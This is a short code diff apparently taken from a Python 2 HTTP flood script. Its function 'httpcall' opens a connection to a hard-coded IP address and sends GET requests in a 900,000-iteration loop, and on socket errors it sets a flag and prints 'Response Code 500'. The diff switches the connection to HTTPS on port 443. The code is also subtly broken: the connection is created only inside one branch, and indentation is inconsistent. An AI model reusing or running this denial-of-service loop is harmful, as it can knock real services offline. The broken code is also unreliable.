@@ -83,13 +83,13 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-		conn = httplib.HTTPConnection("64.233.162.104", 80)
+		conn = httplib.HTTPSConnection("64.233.162.104", 443)
 	
 	try:
 		for i in range(900000):
 		
 			conn.request("GET", 'http://'+host+'/')
-	except socket.error:
+	except socket.error as e:
 			#print e.code
 			set_flag(1)
 			print 'Response Code 500'
